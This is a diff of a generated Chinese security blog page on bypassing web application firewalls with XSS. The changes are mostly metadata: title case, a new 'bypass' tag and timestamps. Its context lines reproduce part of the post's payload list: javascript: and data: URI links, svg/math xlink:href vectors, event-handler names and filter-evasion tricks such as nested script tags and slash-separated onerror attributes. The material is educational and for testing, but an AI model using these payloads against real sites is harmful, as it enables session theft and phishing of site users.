@@ -61,9 +61,9 @@
 </script>
 
   <meta name="description" content="什么是XSS漏洞XSS全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS，比较合适的方式应该叫做跨站脚本攻击。 跨站脚本攻击是一种常见的web安全漏洞，它主要是指攻击者可以在页面中插入恶意脚本代码，当受害者访问这些页面时，浏览器会解析并执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶">
-<meta name="keywords" content="xss">
+<meta name="keywords" content="bypass,xss">
 <meta property="og:type" content="article">
-<meta property="og:title" content="BypassWaf_xss">
+<meta property="og:title" content="bypassWaf_xss">
 <meta property="og:url" content="https://wh0ale.github.io/2018/12/30/2018-12-30-BypassWaf_xss/index.html">
 <meta property="og:site_name" content="Wh0ale&#39;s Blog">
 <meta property="og:description" content="什么是XSS漏洞XSS全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS，比较合适的方式应该叫做跨站脚本攻击。 跨站脚本攻击是一种常见的web安全漏洞，它主要是指攻击者可以在页面中插入恶意脚本代码，当受害者访问这些页面时，浏览器会解析并执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶">
@@ -93,9 +93,9 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2fcazc3bj20qy0ezwiv.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2fe0qt0gj20r00d6djd.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2flkrd5pj20hm0b9ace.jpg">
-<meta property="og:updated_time" content="2019-12-03T06:17:19.140Z">
+<meta property="og:updated_time" content="2019-12-04T08:17:44.233Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="BypassWaf_xss">
+<meta name="twitter:title" content="bypassWaf_xss">
 <meta name="twitter:description" content="什么是XSS漏洞XSS全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS，比较合适的方式应该叫做跨站脚本攻击。 跨站脚本攻击是一种常见的web安全漏洞，它主要是指攻击者可以在页面中插入恶意脚本代码，当受害者访问这些页面时，浏览器会解析并执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyp4d6xll2j20ye0dy403.jpg">
   <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
@@ -108,7 +108,7 @@
   };
 </script>
 
-  <title>BypassWaf_xss | Wh0ale's Blog</title>
+  <title>bypassWaf_xss | Wh0ale's Blog</title>
   
 
 
@@ -309,7 +309,7 @@
       <header class="post-header">
 
         
-          <h1 class="post-title" itemprop="name headline">BypassWaf_xss
+          <h1 class="post-title" itemprop="name headline">bypassWaf_xss
 
               
             
@@ -343,7 +343,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-12-03 14:17:19" itemprop="dateModified" datetime="2019-12-03T14:17:19+08:00">2019-12-03</time>
+                <time title="修改时间：2019-12-04 16:17:44" itemprop="dateModified" datetime="2019-12-04T16:17:44+08:00">2019-12-04</time>
               </span>
             
           
@@ -423,7 +423,7 @@
 <h5 id="src-href-action-xlink-href-autofocus-content-data-等属性"><a href="#src-href-action-xlink-href-autofocus-content-data-等属性" class="headerlink" title="src/href/action/xlink:href/autofocus/content/data 等属性"></a>src/href/action/xlink:href/autofocus/content/data 等属性</h5><p>直接使用伪协议绕过。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">javascript 伪协议： &lt;a href=javascript:alert(2)&gt;test&lt;/a&gt;</span><br><span class="line">data 协议执行 javascript： &lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==&gt;test&lt;/a&gt;(Chrome被拦截，Firefox可以)</span><br><span class="line">urlencode 版本： &lt;a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E&gt;(测试未通过)</span><br><span class="line">不使用 href 的另外一种组合来执行 js： &lt;svg&gt;&lt;a xlink:href=&quot;javascript:alert(14)&quot;&gt;&lt;rect width=&quot;1000&quot; height=&quot;1000&quot; fill=&quot;white&quot;/&gt;&lt;/a&gt;&lt;/svg&gt;（均可） 或者：</span><br><span class="line">&lt;math&gt;&lt;a xlink:href=javascript:alert(1)&gt;1&lt;/a&gt;&lt;/math&gt;(Chrome不可，Firefox可以)</span><br></pre></td></tr></table></figure>
 
-<h5 id="on-事件中"><a href="#on-事件中" class="headerlink" title="on*事件中"></a>on*事件中</h5><p> 插入合乎逻辑的JS代码即可。也可以使用伪协议。</p>
+<h5 id="on事件中"><a href="#on事件中" class="headerlink" title="on事件中"></a>on事件中</h5><p> 插入合乎逻辑的JS代码即可。也可以使用伪协议。</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">onload</span><br><span class="line">onclick</span><br><span class="line">onunload</span><br><span class="line">onchange</span><br><span class="line">onsubmit</span><br><span class="line">onreset</span><br><span class="line">onselect</span><br><span class="line">onblur</span><br><span class="line">onfocus</span><br><span class="line">onabort</span><br><span class="line">onkeydown</span><br><span class="line">onkeypress</span><br><span class="line">onkeyup</span><br><span class="line">ondbclick</span><br><span class="line">onmouseover</span><br><span class="line">onmousemove</span><br><span class="line">onmouseout</span><br><span class="line">onmouseup</span><br><span class="line">onforminput</span><br><span class="line">onformchange</span><br><span class="line">ondrag</span><br><span class="line">ondrop</span><br></pre></td></tr></table></figure>
 
 <h3 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h3><p><strong>单次过滤规则绕过：</strong><code>&lt;scr&lt;script&gt;ipt&gt;</code><br><strong>大小写绕过：</strong><script><br><strong>alert绕过：</strong>可以尝试prompt和confirm<br><strong>没有斜杠：</strong><code>&lt;IMG SRC=javascript:alert(&#39;XSS&#39;)&gt;</code><br><strong>空格被过滤：</strong><code>&lt;img/src=&quot;&quot;onerror=alert(2)&gt;</code> <code>&lt;svg/onload=alert(2)&gt;&lt;/svg&gt;</code><br><strong>长度限制时：</strong><br> (1)<code>&lt;q/oncut=alert(1)&gt;</code><br> (2)</p>
@@ -634,7 +634,7 @@
     <strong>本文作者： </strong>Wh0ale</li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://wh0ale.github.io/2018/12/30/2018-12-30-BypassWaf_xss/" title="BypassWaf_xss">https://wh0ale.github.io/2018/12/30/2018-12-30-BypassWaf_xss/</a>
+    <a href="https://wh0ale.github.io/2018/12/30/2018-12-30-BypassWaf_xss/" title="bypassWaf_xss">https://wh0ale.github.io/2018/12/30/2018-12-30-BypassWaf_xss/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
@@ -646,6 +646,8 @@
           
         
         <div class="post-tags">
+            <a href="/tags/bypass/" rel="tag"><i class="fa fa-tag"></i># bypass</a>
+          
             <a href="/tags/xss/" rel="tag"><i class="fa fa-tag"></i># xss</a>
           
         </div>
@@ -931,7 +933,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#什么是XSS漏洞"><span class="nav-number">1.</span> <span class="nav-text">什么是XSS漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS分类"><span class="nav-number">1.1.</span> <span class="nav-text">XSS分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss-bypass"><span class="nav-number">1.2.</span> <span class="nav-text">xss bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#检测过滤情况"><span class="nav-number">1.2.1.</span> <span class="nav-text">检测过滤情况</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#观察输出位置"><span class="nav-number">1.2.2.</span> <span class="nav-text">观察输出位置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#标签之间"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">标签之间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#js标签之间"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">js标签之间</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#不在字符串内"><span class="nav-number">1.2.2.2.1.</span> <span class="nav-text">不在字符串内</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#在字符串中"><span class="nav-number">1.2.2.2.2.</span> <span class="nav-text">在字符串中</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#输出在HTML属性内"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">输出在HTML属性内</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#文本属性中"><span class="nav-number">1.2.2.3.1.</span> <span class="nav-text">文本属性中</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#src-href-action-xlink-href-autofocus-content-data-等属性"><span class="nav-number">1.2.2.3.2.</span> <span class="nav-text">src/href/action/xlink:href/autofocus/content/data 等属性</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#on-事件中"><span class="nav-number">1.2.2.3.3.</span> <span class="nav-text">on*事件中</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过waf"><span class="nav-number">1.2.3.</span> <span class="nav-text">绕过waf</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF赛题"><span class="nav-number">2.</span> <span class="nav-text">CTF赛题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#xssme"><span class="nav-number">2.1.</span> <span class="nav-text">xssme</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xssrf-leak"><span class="nav-number">2.2.</span> <span class="nav-text">xssrf leak</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xssrf-redis"><span class="nav-number">2.3.</span> <span class="nav-text">xssrf redis</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#B站waf"><span class="nav-number">3.</span> <span class="nav-text">B站waf</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实战"><span class="nav-number">4.</span> <span class="nav-text">实战</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pdf-xss"><span class="nav-number">4.1.</span> <span class="nav-text">pdf xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#上传文件处XSS"><span class="nav-number">4.2.</span> <span class="nav-text">上传文件处XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#excel模版xss"><span class="nav-number">4.3.</span> <span class="nav-text">excel模版xss</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#防御"><span class="nav-number">5.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#补充CSP"><span class="nav-number">6.</span> <span class="nav-text">补充CSP</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#什么是XSS漏洞"><span class="nav-number">1.</span> <span class="nav-text">什么是XSS漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS分类"><span class="nav-number">1.1.</span> <span class="nav-text">XSS分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss-bypass"><span class="nav-number">1.2.</span> <span class="nav-text">xss bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#检测过滤情况"><span class="nav-number">1.2.1.</span> <span class="nav-text">检测过滤情况</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#观察输出位置"><span class="nav-number">1.2.2.</span> <span class="nav-text">观察输出位置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#标签之间"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">标签之间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#js标签之间"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">js标签之间</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#不在字符串内"><span class="nav-number">1.2.2.2.1.</span> <span class="nav-text">不在字符串内</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#在字符串中"><span class="nav-number">1.2.2.2.2.</span> <span class="nav-text">在字符串中</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#输出在HTML属性内"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">输出在HTML属性内</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#文本属性中"><span class="nav-number">1.2.2.3.1.</span> <span class="nav-text">文本属性中</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#src-href-action-xlink-href-autofocus-content-data-等属性"><span class="nav-number">1.2.2.3.2.</span> <span class="nav-text">src/href/action/xlink:href/autofocus/content/data 等属性</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#on事件中"><span class="nav-number">1.2.2.3.3.</span> <span class="nav-text">on事件中</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过waf"><span class="nav-number">1.2.3.</span> <span class="nav-text">绕过waf</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF赛题"><span class="nav-number">2.</span> <span class="nav-text">CTF赛题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#xssme"><span class="nav-number">2.1.</span> <span class="nav-text">xssme</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xssrf-leak"><span class="nav-number">2.2.</span> <span class="nav-text">xssrf leak</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xssrf-redis"><span class="nav-number">2.3.</span> <span class="nav-text">xssrf redis</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#B站waf"><span class="nav-number">3.</span> <span class="nav-text">B站waf</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实战"><span class="nav-number">4.</span> <span class="nav-text">实战</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pdf-xss"><span class="nav-number">4.1.</span> <span class="nav-text">pdf xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#上传文件处XSS"><span class="nav-number">4.2.</span> <span class="nav-text">上传文件处XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#excel模版xss"><span class="nav-number">4.3.</span> <span class="nav-text">excel模版xss</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#防御"><span class="nav-number">5.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#补充CSP"><span class="nav-number">6.</span> <span class="nav-text">补充CSP</span></a></li></ol></div>
             
 
           </div>
